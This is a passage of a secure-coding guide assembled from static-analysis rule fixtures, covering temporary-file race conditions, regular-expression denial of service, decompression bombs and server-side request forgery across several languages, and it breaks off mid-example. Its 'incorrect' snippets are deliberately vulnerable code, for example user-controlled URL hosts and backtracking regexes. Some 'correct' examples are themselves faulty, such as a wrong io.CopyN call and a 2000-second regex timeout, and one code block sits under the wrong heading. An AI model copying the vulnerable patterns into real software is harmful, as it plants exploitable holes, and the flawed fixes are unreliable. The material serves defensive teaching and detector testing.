- [Brakeman Mass Assignment Checks](https://github.com/presidentbeef/brakeman/blob/main/lib/brakeman/checks/check_model_attr_accessible.rb)

### 0.16 Prevent Race Conditions

**Impact: MEDIUM (Time-of-check Time-of-use (TOCTOU) vulnerabilities, insecure temporary files, data corruption)**

Race conditions occur when the behavior of software depends on the timing or sequence of events that execute in an unpredictable order. Time-of-check Time-of-use (TOCTOU) vulnerabilities are a specific type of race condition where a resource's state is checked at one point in time but used at a later point, allowing an attacker to modify the resource between the check and use.

Common race condition patterns include:

- **Insecure temporary file creation**: Using functions that create predictable filenames, allowing attackers to create symlinks or replace files before they are opened

- **TOCTOU file operations**: Checking file existence/permissions then operating on the file, creating a window for manipulation

- **Hardcoded temporary paths**: Writing to shared /tmp directories without secure file creation, enabling symlink attacks

---

Using `Filename.temp_file` might lead to race conditions since the file could be altered or replaced by a symlink before being opened.

**Incorrect: vulnerable to race condition**

```ocaml
(* ruleid:ocamllint-tempfile *)
let ofile = Filename.temp_file "test" "" in
Printf.printf "%s\n" ofile
```

**Correct: use safer alternatives**

```ocaml
(* Use open_temp_file which returns both the filename and an open channel *)
let (filename, oc) = Filename.open_temp_file "test" "" in
Printf.fprintf oc "data\n";
close_out oc
```

**References:**

- CWE-367: Time-of-check Time-of-use (TOCTOU) Race Condition

- [OCaml Filename Module Documentation](https://v2.ocaml.org/api/Filename.html)

---

The `tempfile.mktemp()` function is explicitly marked as unsafe in Python's documentation. The file name returned may not exist when generated, but by the time you attempt to create it, another process may have created a file with that name.

**Incorrect: vulnerable to race condition**

```python
import tempfile as tf

# ruleid: tempfile-insecure
x = tempfile.mktemp()
# ruleid: tempfile-insecure
x = tempfile.mktemp(dir="/tmp")
```

**Correct: use secure alternatives**

```python
import tempfile

# Use NamedTemporaryFile which atomically creates and opens the file
with tempfile.NamedTemporaryFile(mode='w', delete=False) as f:
    f.write("data")
    filename = f.name

# Or use mkstemp which returns both file descriptor and name
fd, path = tempfile.mkstemp()
try:
    with os.fdopen(fd, 'w') as f:
        f.write("data")
finally:
    os.unlink(path)
```

**References:**

- CWE-377: Insecure Temporary File

- [Python tempfile Documentation](https://docs.python.org/3/library/tempfile.html)

---

Using hardcoded paths in shared temporary directories like `/tmp` is insecure because other users on the system can predict and manipulate these files.

**Incorrect: hardcoded tmp path**

```python
def test1():
    # ruleid:hardcoded-tmp-path
    f = open("/tmp/blah.txt", 'w')
    f.write("hello world")
    f.close()

def test2():
    # ruleid:hardcoded-tmp-path
    f = open("/tmp/blah/blahblah/blah.txt", 'r')
    data = f.read()
    f.close()

def test4():
    # ruleid:hardcoded-tmp-path
    with open("/tmp/blah.txt", 'r') as fin:
        data = fin.read()
```

**Correct: use tempfile module or relative paths**

```python
def test3():
    # ok:hardcoded-tmp-path
    f = open("./tmp/blah.txt", 'w')
    f.write("hello world")
    f.close()

def test3a():
    # ok:hardcoded-tmp-path
    f = open("/var/log/something/else/tmp/blah.txt", 'w')
    f.write("hello world")
    f.close()

def test5():
    # ok:hardcoded-tmp-path
    with open("./tmp/blah.txt", 'w') as fout:
        fout.write("hello world")
```

**References:**

- CWE-377: Insecure Temporary File

- [Python tempfile.TemporaryFile Documentation](https://docs.python.org/3/library/tempfile.html#tempfile.TemporaryFile)

---

Creating files directly in `/tmp` without using `ioutil.TempFile` or `os.CreateTemp` is vulnerable to race conditions and symlink attacks.

**Incorrect: hardcoded tmp path**

```go
package samples

import (
	"fmt"
	"io/ioutil"
)

func main() {
	// ruleid:bad-tmp-file-creation
	err := ioutil.WriteFile("/tmp/demo2", []byte("This is some data"), 0644)
	if err != nil {
		fmt.Println("Error while writing!")
	}
}
```

**Correct: use TempFile for atomic creation**

```go
import "os"

func secureTemp() error {
    // Atomically creates a file with a random suffix
    f, err := os.CreateTemp("", "prefix-*.txt")
    if err != nil {
        return err
    }
    defer f.Close()

    _, err = f.WriteString("secure data")
    return err
}
```

**Best Practice:** Use `os.CreateTemp` (Go 1.16+) or `ioutil.TempFile` which atomically creates a new file with a unique name.

**References:**

- CWE-377: Insecure Temporary File

- [OWASP Broken Access Control](https://owasp.org/Top10/A01_2021-Broken_Access_Control)

- [Go ioutil.TempFile Documentation](https://pkg.go.dev/io/ioutil#TempFile)

---

1. **Never use predictable filenames** - Always use secure random names

2. **Use atomic file creation** - Functions that create and open in one operation

3. **Set restrictive permissions** - Use mode 0600 or 0700 for temporary files/directories

4. **Use per-user temporary directories** - Consider using `$TMPDIR` or user-specific paths

5. **Clean up properly** - Delete temporary files in a finally block or defer statement

1. **Avoid check-then-use patterns** - Don't check file existence before opening

2. **Use atomic operations** - Prefer operations that check and act atomically

3. **Use file descriptors** - Once opened, operate on the descriptor not the path

4. **Lock files when needed** - Use advisory or mandatory locks for shared resources

| Language | Insecure | Secure Alternative |

|----------|----------|-------------------|

| Python | `tempfile.mktemp()` | `tempfile.NamedTemporaryFile()`, `tempfile.mkstemp()` |

| Go | `ioutil.WriteFile("/tmp/...")` | `os.CreateTemp()`, `ioutil.TempFile()` |

| OCaml | `Filename.temp_file` | `Filename.open_temp_file` |

| C | `tmpnam()`, `tempnam()` | `mkstemp()`, `mkstemps()` |

| Java | `File.createTempFile()` then open | `Files.createTempFile()` with immediate use |

**References:**

- [CWE-367: Time-of-check Time-of-use (TOCTOU) Race Condition](https://cwe.mitre.org/data/definitions/367.html)

- [CWE-377: Insecure Temporary File](https://cwe.mitre.org/data/definitions/377.html)

- [OWASP Race Conditions](https://owasp.org/www-community/vulnerabilities/Race_Conditions)

### 0.17 Prevent Regular Expression DoS

**Impact: MEDIUM (Service disruption through CPU exhaustion via malicious regex patterns)**

Regular Expression Denial of Service (ReDoS) occurs when attackers exploit inefficient regular expression patterns to cause excessive CPU consumption. Certain regex patterns with nested quantifiers or overlapping alternatives can experience "catastrophic backtracking" when matched against malicious input, causing the regex engine to take exponential time to evaluate.

Common vulnerable patterns include:

- Nested quantifiers: `(a+)+`, `(a*)*`, `(a|a)+`

- Overlapping alternatives: `(a|aa)+`

- Unbounded repetition with overlap: `.*.*`

**Incorrect: vulnerable ReDoS pattern**

```javascript
// ruleid: detect-redos
const re = new RegExp("([a-z]+)+$", "i");
// ruleid: detect-redos
const re = new RegExp(/([a-z]+)+$/, "i");

var r = /^\w+([-_+.]\w+)*@\w+([-.]\w+)*\.\w+([-.]\w+)*$/
// ruleid: detect-redos
new RegExp(r, "i");
// ruleid: detect-redos
r.test(a)
// ruleid: detect-redos
"a".match(r)
```

**Correct: safe regex patterns**

```javascript
// ok: detect-redos
"a".match(b)
// ok: detect-redos
"a".match("([a-z])")
var c = /([a-z])/
// ok: detect-redos
c.test(a)
```

**References:**

- [OWASP ReDoS](https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service_-_ReDoS)

- [Regular-Expressions.info ReDoS](https://www.regular-expressions.info/redos.html)

- CWE-1333: Inefficient Regular Expression Complexity

---

**Incorrect: non-literal RegExp with user input**

```javascript
function bad (name) {
  //ruleid: detect-non-literal-regexp
  const reg = new RegExp("\\w+" + name)
  return reg.exec(name)
}
```

**Correct: hardcoded regex patterns**

```javascript
function ok (name) {
  //ok: detect-non-literal-regexp
  const reg = new RegExp("\\w+")
  return reg.exec(name)
}

function jsliteral (name) {
  const exp = /a.*/;
  //ok: detect-non-literal-regexp
  const reg = new RegExp(exp);
  return reg.exec(name);
}
```

**References:**

- [OWASP ReDoS](https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service_-_ReDoS)

- CWE-1333: Inefficient Regular Expression Complexity

---

**Incorrect: incomplete string sanitization**

```javascript
function escapeQuotes(s) {
    // ruleid:incomplete-sanitization
    return s.replace("'", "''");
}

function removeTabs(s) {
    // ruleid:incomplete-sanitization
    return s.replace('\t', "");
}

function escapeHtml(html) {
  // ruleid:incomplete-sanitization
  return html
    .replace("<", "")
    .replace(">", "");
}
```

**Correct: use regex with global flag**

```javascript
function okTest(s) {
    return s.replace("foo", "bar");
}

function okEscapeQuotes(s) {
    return s.replace(/'/g, "''");
}
```

**References:**

```javascript
import express from 'express';
import Ajv from 'ajv';

function test1() {
    const settings = { allErrors: true, smth: 'else' }
    // ruleid: ajv-allerrors-true
    const ajv1 = new Ajv(settings);
    return ajv1
}

function test2() {
    // ruleid: ajv-allerrors-true
    var ajv = new Ajv({ allErrors: true, smth: 'else' });
    ajv.addSchema(schema, 'input');
}


function test3() {
    // ruleid: ajv-allerrors-true
    var ajv = new Ajv({  smth: 'else', allErrors: true });
    ajv.addSchema(schema, 'input');
}

function test4() {
    // ruleid: ajv-allerrors-true
    var ajv = new Ajv({  smth: 'else', smth: 'else', allErrors: true, smth: 'else' });
    ajv.addSchema(schema, 'input');
}
```

- [OWASP Injection](https://owasp.org/Top10/A03_2021-Injection)

- CWE-116: Improper Encoding or Escaping of Output

---

**Incorrect (Ajv allErrors: true enables DoS):**

**Correct: disable allErrors in production**

```javascript
function okTest1() {
    // ok: ajv-allerrors-true
    let ajv = new Ajv({ allErrors: process.env.DEBUG });
    ajv.addSchema(schema, 'input');
}

function okTest2() {
    // ok: ajv-allerrors-true
    var ajv = new Ajv({  smth: 'else', allErrors: false });
    ajv.addSchema(schema, 'input');
}
```

**References:**

- [Ajv allErrors Option](https://ajv.js.org/options.html#allerrors)

- CWE-400: Uncontrolled Resource Consumption

---

**Incorrect: CORS regex with unescaped dots**

```typescript
const corsDomains = [
  /localhost\:/,
  /(.+\.)*foo\.com$/,
  /(.+\.)*foobar\.com$/, // matches *.foobar.com,
  // ruleid: cors-regex-wildcard
  /^(http|https):\/\/(qix|qux).biz.baz.foobar.com$/,
  /^(http|https):\/\/www\.bar\.com$/,
  // ruleid: cors-regex-wildcard
  /^(http|https):\/\/www.foo.com$/,
];

const CORS = [
  /localhost\:/,
  /(.+\.)*foo\.com$/,
  /(.+\.)*foobar\.com$/, // matches *.foobar.com,
  // ruleid: cors-regex-wildcard
  /^(http|https):\/\/(qix|qux).biz.baz.foobar.com$/,
  /^(http|https):\/\/www\.bar\.com$/,
  // ruleid: cors-regex-wildcard
  /^(http|https):\/\/www.foo.com$/,
];

// ruleid: cors-regex-wildcard
const corsOrigin = /^(http|https):\/\/www.foo.com$/;
```

**Correct: escape dots in CORS regex**

```typescript
const urls = [
  /localhost\:/,
  /(.+\.)*foo\.com$/,
  /(.+\.)*foobar\.com$/, // matches *.foobar.com,
  /^(http|https):\/\/(qix|qux).biz.baz.foobar.com$/,
  /^(http|https):\/\/www\.bar\.com$/,
  /^(http|https):\/\/www.foo.com$/,
];
```

**References:**

- [OWASP Insecure Design](https://owasp.org/Top10/A04_2021-Insecure_Design)

- CWE-183: Permissive List of Allowed Inputs

---

**Incorrect: inefficient regex pattern**

```python
import re

redos = r"^(a+)+$"
regex = r"^[0-9]+$"

data = "foo"

# ruleid: regex_dos
pattern = re.compile(redos)
pattern.search(data)

# ruleid: regex_dos
pattern = re.compile(redos)
pattern.match(data)

# ruleid: regex_dos
pattern = re.compile(redos)
pattern.findall(data)
```

**Correct: safe regex patterns**

```python
import re

redos = r"^(a+)+$"
regex = r"^[0-9]+$"

data = "foo"

# ok: regex_dos
pattern = re.compile(regex)
pattern.search(data)

# ok: regex_dos
pattern = re.compile(regex)
pattern.fullmatch(data)

# ok: regex_dos
pattern = re.compile(regex)
pattern.split(data)

# ok: regex_dos
pattern.escape(redos)

# ok: regex_dos
pattern = re.compile(redos)
pattern.purge()
```

**References:**

- [Python re module](https://docs.python.org/3/library/re.html)

- CWE-1333: Inefficient Regular Expression Complexity

---

**Incorrect: missing Django REST Framework throttle config**

```python
# ruleid: missing-throttle-config
REST_FRAMEWORK = {
    'PAGE_SIZE': 10
}
```

**Correct: throttle config enabled**

```python
# ok: missing-throttle-config
REST_FRAMEWORK = {
    'PAGE_SIZE': 10,
    'DEFAULT_THROTTLE_CLASSES': [
        'rest_framework.throttling.AnonRateThrottle',
        'rest_framework.throttling.UserRateThrottle'
    ],
    'DEFAULT_THROTTLE_RATES': {
        'anon': '100/day',
        'user': '1000/day'
    },
    "SOMETHING_ELSE": {1: 2}
}
```

**References:**

- [Django REST Framework Throttling](https://www.django-rest-framework.org/api-guide/throttling/#setting-the-throttling-policy)

- CWE-400: Uncontrolled Resource Consumption

---

**Incorrect: user-controlled regex**

```ruby
def some_rails_controller
  foo = params[:some_regex]
  #ruleid: check-regex-dos
  Regexp.new(foo).match("some_string")
end

def some_rails_controller
  foo = Record[something]
  #ruleid: check-regex-dos
  Regexp.new(foo).match("some_string")
end

def some_rails_controller
  foo = Record.read_attribute("some_attribute")
  #ruleid: check-regex-dos
  Regexp.new(foo).match("some_string")
end

def use_params_in_regex
#ruleid: check-regex-dos
@x = something.match /#{params[:x]}/
end
```

**Correct: safe regex usage**

```ruby
def some_rails_controller
  bar = ENV['someEnvVar']
  #ok: check-regex-dos
  Regexp.new(bar).match("some_string")
end

def regex_on_params
#ok: check-regex-dos
@x = params[:x].match /foo/
end
```

**References:**

- [OWASP ReDoS](https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service_-_ReDoS)

- CWE-1333: Inefficient Regular Expression Complexity

---

**Incorrect: incorrectly-bounded Rails validation regex**

```ruby
class Account < ActiveRecord::Base
  #ruleid: check-validation-regex
  validates :username, :length => 6..20, :format => /([a-z][0-9])+/i
  #ruleid: check-validation-regex
  validates :phone, :format => { :with => /(\d{3})-(\d{3})-(\d{4})/, :on => :create }, :presence => true
  #ruleid: check-validation-regex
  validates :first_name, :format => /\w+/
  serialize :cc_info #safe from CVE-2013-0277
  attr_accessible :blah_admin_blah
end

class Account < ActiveRecord::Base
  #ruleid: check-validation-regex
  validates_format_of :name, :with => /^[a-zA-Z]+$/
  #ruleid: check-validation-regex
  validates_format_of :blah, :with => /\A[a-zA-Z]+$/
  #ruleid: check-validation-regex
  validates_format_of :blah2, :with => /^[a-zA-Z]+\Z/
  #ruleid: check-validation-regex
  validates_format_of :something, :with => /[a-zA-Z]\z/
end
```

**Correct: properly-bounded regex with \A and \Z**

```ruby
class Account < ActiveRecord::Base
  #ok: check-validation-regex
  validates_format_of :good_valid, :with => /\A[a-zA-Z]\z/ #No warning
  #ok: check-validation-regex
  validates_format_of :not_bad, :with => /\A[a-zA-Z]\Z/ #No warning
end
```

Ruby regex behavior is multiline by default. Use `\A` for beginning of string and `\Z` (or `\z`) for end of string instead of `^` and `$`.

**References:**

- [Brakeman Format Validation](https://brakemanscanner.org/docs/warning_types/format_validation/)

- CWE-185: Incorrect Regular Expression

---

**Incorrect: regex without timeout on untrusted input**

```csharp
using System.Text.RegularExpressions;

namespace RegularExpressionsDos
{
    public class RegularExpressionsDos
    {
        // ruleid: regular-expression-dos
        public void ValidateRegex(string search)
        {
            Regex rgx = new Regex("^A(B|C+)+D");
            rgx.Match(search);

        }

        // ruleid: regular-expression-dos
        public void ValidateRegex2(string search)
        {
            Regex rgx = new Regex("^A(B|C+)+D", new RegexOptions { });
            rgx.Match(search);

        }

        // ruleid: regular-expression-dos
        public void Validate4(string search)
        {
            var pattern = @"^A(B|C+)+D";
            var result = Regex.Match(search, pattern);
        }

        // ruleid: regular-expression-dos
        public void Validate5(string search)
        {
            var pattern = @"^A(B|C+)+D";
            var result = Regex.Match(search, pattern, new RegexOptions { });
        }
    }
}
```

**Correct: regex with timeout**

```csharp
using System.Text.RegularExpressions;

namespace RegularExpressionsDos
{
    public class RegularExpressionsDos
    {
        // ok: regular-expression-dos
        public void ValidateRegex3(string search)
        {
            Regex rgx = new Regex("^A(B|C+)+D", new RegexOptions { }, TimeSpan.FromSeconds(2000));
            rgx.Match(search);

        }

        // ok: regular-expression-dos
        public void Validate5(string search)
        {
            var pattern = @"^A(B|C+)+D";
            var result = Regex.Match(search, pattern, new RegexOptions { }, TimeSpan.FromSeconds(2000));
        }
    }
}
```

**References:**

- [OWASP ReDoS](https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service_-_ReDoS)

- [.NET Regular Expressions](https://docs.microsoft.com/en-us/dotnet/standard/base-types/regular-expressions#regular-expression-examples)

- CWE-1333: Inefficient Regular Expression Complexity

---

**Incorrect: regex with excessive or infinite timeout**

```csharp
using System.Text.RegularExpressions;

namespace RegularExpressionsDosInfiniteTimeout
{
    public class RegularExpressionsDosInfiniteTimeout
    {
        // ruleid: regular-expression-dos-infinite-timeout
        Regex rgx = new Regex(pattern, RegexOptions.IgnoreCase, TimeSpan.FromSeconds(10));

        // ruleid: regular-expression-dos-infinite-timeout
        Regex rgx = new Regex(pattern, RegexOptions.IgnoreCase, TimeSpan.InfiniteMatchTimeout);

        // ruleid: regular-expression-dos-infinite-timeout
        Regex rgx = new Regex(pattern, RegexOptions.IgnoreCase, TimeSpan.FromMinutes(1));

        // ruleid: regular-expression-dos-infinite-timeout
        Regex rgx = new Regex(pattern, RegexOptions.IgnoreCase, TimeSpan.FromHours(1));
    }
}
```

**Correct: regex with short timeout**

```csharp
using System.Text.RegularExpressions;

namespace RegularExpressionsDosInfiniteTimeout
{
    public class RegularExpressionsDosInfiniteTimeout
    {
        // ok
        Regex rgx = new Regex(pattern, RegexOptions.IgnoreCase, TimeSpan.FromSeconds(1));
    }
}
```

Consider setting the timeout to a short amount of time like 2 or 3 seconds. If you are sure you need an infinite timeout, double check that your context meets the conditions outlined in the "Notes to Callers" section at the bottom of this page: https://docs.microsoft.com/en-us/dotnet/api/system.text.regularexpressions.regex.-ctor?view=net-6.0

**References:**

- [OWASP ReDoS](https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service_-_ReDoS)

- [Regex.InfiniteMatchTimeout](https://docs.microsoft.com/en-us/dotnet/api/system.text.regularexpressions.regex.infinitematchtimeout)

- [Regex Constructor](https://docs.microsoft.com/en-us/dotnet/api/system.text.regularexpressions.regex.-ctor?view=net-6.0)

- CWE-1333: Inefficient Regular Expression Complexity

---

**Incorrect: decompression without size limit - zip bomb**

```go
// cf. https://github.com/securego/gosec/blob/master/testutils/source.go#L684

package main
import (
	"bytes"
	"compress/zlib"
	"io"
	"os"
)
func blah() {
	buff := []byte{120, 156, 202, 72, 205, 201, 201, 215, 81, 40, 207,
		47, 202, 73, 225, 2, 4, 0, 0, 255, 255, 33, 231, 4, 147}
	b := bytes.NewReader(buff)
	r, err := zlib.NewReader(b)
	if err != nil {
		panic(err)
	}
	// ruleid: potential-dos-via-decompression-bomb
	_, err := io.Copy(os.Stdout, r)
	if err != nil {
		panic(err)
	}
	r.Close()
}

func blah2() {
	buff := []byte{120, 156, 202, 72, 205, 201, 201, 215, 81, 40, 207,
		47, 202, 73, 225, 2, 4, 0, 0, 255, 255, 33, 231, 4, 147}
	b := bytes.NewReader(buff)
	r, err := zlib.NewReader(b)
	if err != nil {
		panic(err)
	}
	buf := make([]byte, 8)
	// ruleid: potential-dos-via-decompression-bomb
	_, err := io.CopyBuffer(os.Stdout, r, buf)
	if err != nil {
		panic(err)
	}
	r.Close()
}

func blah3() {
	r, err := zip.OpenReader("tmp.zip")
	if err != nil {
		panic(err)
	}
	defer r.Close()
	for i, f := range r.File {
		out, err := os.OpenFile("output" + strconv.Itoa(i), os.O_WRONLY|os.O_CREATE|os.O_TRUNC, f.Mode())
		if err != nil {
			panic(err)
		}
		rc, err := f.Open()
		if err != nil {
			panic(err)
		}
		// ruleid: potential-dos-via-decompression-bomb
		_, err = io.Copy(out, rc)
		out.Close()
		rc.Close()
		if err != nil {
			panic(err)
		}
	}
}
```

**Correct: use io.CopyN with size limit**

```go
func benign() {
	s, err := os.Open("src")
	if err != nil {
		panic(err)
	}
	defer s.Close()
	d, err := os.Create("dst")
	if err != nil {
		panic(err)
	}
	defer d.Close()
	// ok: potential-dos-via-decompression-bomb
	_, err = io.Copy(d, s)
	if  err != nil {
		panic(err)
	}
}

func ok() {
	buff := []byte{120, 156, 202, 72, 205, 201, 201, 215, 81, 40, 207,
		47, 202, 73, 225, 2, 4, 0, 0, 255, 255, 33, 231, 4, 147}
	b := bytes.NewReader(buff)
	r, err := zlib.NewReader(b)
	if err != nil {
		panic(err)
	}
	buf := make([]byte, 8)
	// ok: potential-dos-via-decompression-bomb
	_, err := io.CopyN(os.Stdout, r, buf, 1024*1024*4)
	if err != nil {
		panic(err)
	}
	r.Close()
}
```

By limiting the max bytes read with `io.CopyN()`, you can mitigate zip bomb attacks.

**References:**

- [Go io.CopyN](https://golang.org/pkg/io/#CopyN)

- [gosec decompression-bomb rule](https://github.com/securego/gosec/blob/master/rules/decompression-bomb.go)

- CWE-400: Uncontrolled Resource Consumption

---

**References:**

- CWE-1333: Inefficient Regular Expression Complexity

- CWE-400: Uncontrolled Resource Consumption

- CWE-185: Incorrect Regular Expression

- [OWASP ReDoS](https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service_-_ReDoS)

- [Regular-Expressions.info ReDoS](https://www.regular-expressions.info/redos.html)

### 0.18 Prevent Server-Side Request Forgery

**Impact: HIGH (Attackers can make requests from the server to internal systems, cloud metadata endpoints, or external services)**

Server-Side Request Forgery (SSRF) occurs when an attacker can make a server-side application send HTTP requests to an arbitrary domain of the attacker's choosing. This can be used to:

- Access internal services and APIs that are not exposed to the internet

- Read cloud metadata endpoints (e.g., AWS EC2 metadata at 169.254.169.254)

- Scan internal networks and ports

- Bypass firewalls and access controls

- Exfiltrate sensitive data

**Incorrect: Django - user data flows into URL host**

```python
from django.http import HttpResponse
import requests

def ex1(request):
  env = request.POST.get('env')
  user_name = request.POST.get('user_name')
  # ruleid: tainted-url-host
  user_age = requests.get("https://%s/%s/age" % (env, user_name))
  return HttpResponse(user_age)

def ex2(request):
  env = request.POST.get('env')
  user_name = request.POST.get('user_name')
  # ruleid: tainted-url-host
  user_age = requests.get("https://{}/{}/age".format(env, user_name))
  return HttpResponse(user_age)

def ex3(request):
  env = request.POST.get('env')
  user_name = request.POST.get('user_name')
  # ruleid: tainted-url-host
  user_age = requests.get(f"https://{env}/{user_name}/age")
  return HttpResponse(user_age)
```

**Correct: Django - fixed host with user data in path only**

```python
from django.http import HttpResponse
import requests

def ok1(request):
  env = request.POST.get('env')
  user_name = request.POST.get('user_name')
  # ok: tainted-url-host
  user_age = requests.get("https://example.com/%s/%s/age" % (env, user_name))
  return HttpResponse(user_age)

def ok2(request):
  env = request.POST.get('env')
  user_name = request.POST.get('user_name')
  # ok: tainted-url-host
  user_age = requests.get("https://example.com/%s/%s/age".format(env, user_name))
  return HttpResponse(user_age)
```

**Incorrect: Django - SSRF via requests library**

```python
from requests import get
from django.shortcuts import render

def send_to_redis(request):
    # ruleid: ssrf-injection-requests
    bucket = request.GET.get("bucket")
    inner_response = get("http://my.redis.foo/{}".format(bucket), data=3)
    return render({"response_code": inner_response.status_code})

def send_to_redis_fstring(request):
    # ruleid: ssrf-injection-requests
    bucket = request.GET.get("bucket")
    inner_response = get(f"http://my.redis.foo/{bucket}", data=3)
    return render({"response_code": inner_response.status_code})
```

**Incorrect: Django - SSRF via urllib**

```python
from urllib.request import urlopen
from django.shortcuts import render

def send_to_redis(request):
    # ruleid: ssrf-injection-urllib
    bucket = request.GET.get("bucket")
    inner_response = urlopen("http://my.redis.foo/{}".format(bucket), data=3)
    return render({"response_code": inner_response.status_code})
```

**Incorrect: Flask - user data flows into URL host**

```python
import flask
import requests

app = flask.Flask(__name__)

@app.route("/route_param/<route_param>")
def route_param(route_param):
    print("blah")
    # ruleid: tainted-url-host
    url = "https://%s/path" % route_param
    requests.get(url)
    return True

@app.route("/get_param_inline", methods=["GET"])
def get_param_inline():
    # ruleid: tainted-url-host
    return "<a href='https://%s/path'>Click me!</a>" % flask.request.args.get("param")

@app.route("/get_param_inline_concat", methods=["GET"])
def get_param_inline_concat():
    # ruleid: tainted-url-host
    return "<a href='http://" + flask.request.args.get("param") + "'>Click me!</a>"
```

**Correct: Flask - fixed host, user data only in path**

```python
import flask
import requests

app = flask.Flask(__name__)

@app.route("/route_param_ok/<route_param>")
def route_param_ok(route_param):
    print("blah")
    # ok: tainted-url-host
    return "<a href='https://example.com'>Click me!</a>"

@app.route("/get_param_inline_concat_ok_in_path", methods=["GET"])
def get_param_inline_concat_ok_in_path():
    # ok: tainted-url-host
    return "<a href='http://example.com/" + flask.request.args.get("param") + "'>Click me!</a>"

@app.route("/route_param/<route_param>")
def doesnt_use_the_route_param(route_param):
    not_the_route_param = "hello.com"
    # ok: tainted-url-host
    url = "https://%s/path" % not_the_route_param
    requests.get(url)
    return True
```

**Incorrect: Flask - SSRF via requests**

```python
import flask
import requests

app = flask.Flask(__name__)

@app.route("/route_param/<route_param>")
def route_param(route_param):
    print("blah")
    # ruleid: ssrf-requests
    return requests.get(route_param)

@app.route("/get_param", methods=["GET"])
def get_param():
    param = flask.request.args.get("param")
    # ruleid: ssrf-requests
    requests.post(param, timeout=10)

@app.route("/get_param_concat", methods=["GET"])
def get_param_concat():
    param = flask.request.args.get("param")
    # ruleid: ssrf-requests
    requests.get(param + "/id")
```

**Correct: Flask - safe requests usage**

```python
import flask
import requests

app = flask.Flask(__name__)

@app.route("/route_param_ok/<route_param>")
def route_param_ok(route_param):
    print("blah")
    # ok: ssrf-requests
    return requests.get("this is safe")

@app.route("/get_param_ok", methods=["GET"])
def get_param_ok():
    param = flask.request.args.get("param")
    # ok: ssrf-requests
    requests.post("this is safe", timeout=10)

@app.route("/ok")
def ok():
    requests.get("https://www.google.com")
```

**Incorrect: Flask - host header injection**

```python
from flask import Flask, request
from flask_mail import Mail, Message

app = Flask(__name__)
mail = Mail(app)

@app.route("/reset_password", methods=["POST"])
def reset_password():
    email = request.form.get("email")
    if not email:
        return "Invalid email", 400
    # ruleid: host-header-injection-python
    reset_link = "https://"+request.host+"reset/"+request.headers.get('reset_token')
    msg = Message('Password reset request', recipients=[email])
    msg.body = "Please click on the link to reset your password: " + reset_link
    mail.send(msg)
    return "Password reset email sent!"
```

**Correct: Flask - avoid using request.host**

```python
from flask import Flask, request
from flask_mail import Mail, Message

app = Flask(__name__)
mail = Mail(app)

@app.route("/reset_password", methods=["POST"])
def reset_password():
    email = request.form.get("email")
    if not email:
        return "Invalid email", 400
    # ok: host-header-injection-python
    reset_link = "https://"+request.foo+"reset/"+request.headers.get('reset_token')
    msg = Message('Password reset request', recipients=[email])
    msg.body = "Please click on the link to reset your password: " + reset_link
    mail.send(msg)
    return "Password reset email sent!"
```

---

**Incorrect: Express - SSRF via request library**

```typescript
import { Request, Response, NextFunction } from 'express'

const request = require('request')

module.exports = function badNormal () {
  return (req: Request, res: Response, next: NextFunction) => {
    const url = "//"+req.body.imageUrl
    const url1 = req.body['imageUrl'] + 123
    // ruleid: express-ssrf
    request.get(url)
    // ruleid: express-ssrf
    request.get(url1+123)

    // ruleid: express-ssrf
    request.get(req.body.url)
    // ruleid: express-ssrf
    request.get(`${req.query.url}/fooo`)
    // ruleid: express-ssrf
    request.get("//"+req.query.url+config_value.url)

    const a = req.body.url
    // ruleid: express-ssrf
    request.get(a)
  }
}
```

**Correct: Express - user data only in path, not host**

```typescript
import { Request, Response, NextFunction } from 'express'

const request = require('request')

module.exports = function goodNormal () {
  return (req: Request, res: Response, next: NextFunction) => {
    // ok: express-ssrf
    request.get(`https://reddit.com/${req.query.url}/fooo`)
    // ok: express-ssrf
    request.get("https://google.com/"+req.query.url)
    // ok: express-ssrf
    request.get(config_value.foo+req.query.url)
    // ok: express-ssrf
    request.get(config_value.foo+req.body.shouldalsonotcatch)
  }
}
```

**Incorrect: Puppeteer - goto injection**

```javascript
const puppeteer = require('puppeteer');

const testFunc = async (userInput) => {
  const browser = await puppeteer.launch();
  const page = await browser.newPage();

  // ruleid:puppeteer-goto-injection
  await page.goto(unverifiedInput());

  const newUrl = userInput;
  // ruleid:puppeteer-goto-injection
  await page.goto(newUrl);

  await page.screenshot({path: 'example.png'});
  await browser.close();
};
```

**Correct: Puppeteer - hardcoded URL**

```javascript
const puppeteer = require('puppeteer');

const testFunc = async (userInput) => {
  const browser = await puppeteer.launch();
  const page = await browser.newPage();
  let url = 'https://hardcoded.url.com'
  // ok
  await page.goto('https://example.com');

  // ok
  await page.goto(url);

  await page.screenshot({path: 'example.png'});
  await browser.close();
};
```

**Incorrect: Express + Puppeteer - combined SSRF**

```javascript
const express = require('express')
const app = express()
const puppeteer = require('puppeteer')

app.get('/', async (req, res) => {
    const browser = await puppeteer.launch()
    const page = await browser.newPage()
    const url = `https://${req.query.name}`
    // ruleid: express-puppeteer-injection
    await page.goto(url)

    await page.screenshot({path: 'example.png'})
    await browser.close()
    res.send('Hello World!')
})

app.post('/test', async (req, res) => {
    const browser = await puppeteer.launch()
    const page = await browser.newPage()
    // ruleid: express-puppeteer-injection
    await page.setContent(`${req.body.foo}`)

    await page.screenshot({path: 'example.png'})
    await browser.close()
    res.send('Hello World!')
})

const controller = async (req, res) => {
    const browser = await puppeteer.launch();
    const page = await browser.newPage();
    const body = req.body.foo;
    // ruleid: express-puppeteer-injection
    await page.setContent('<html>' + body + '</html>');

    await page.screenshot({path: 'example.png'});
    await browser.close();
    res.send('Hello World!');
}
```

**Correct: Express + Puppeteer - safe usage**

```javascript
const express = require('express')
const app = express()
const puppeteer = require('puppeteer')

app.post('/ok-test', async (req, res) => {
    const browser = await puppeteer.launch();
    const page = await browser.newPage();
    // ok: express-puppeteer-injection
    await page.goto('https://example.com');

    await page.screenshot({path: 'example.png'});
    await browser.close();
    res.send('Hello World!');
})

const controller = async (req, res) => {
    const browser = await puppeteer.launch();
    const page = await browser.newPage();
    // ok: express-puppeteer-injection
    const body = '<div>123</div>';
    await page.setContent('<html>' + body + '</html>');

    await page.screenshot({path: 'example.png'});
    await browser.close();
    res.send('Hello World!');
}
```

**Incorrect: Phantom.js - page open injection**

```javascript
const phantom = require('phantom');

(async function() {
  const instance = await phantom.create();
  const page = await instance.createPage();
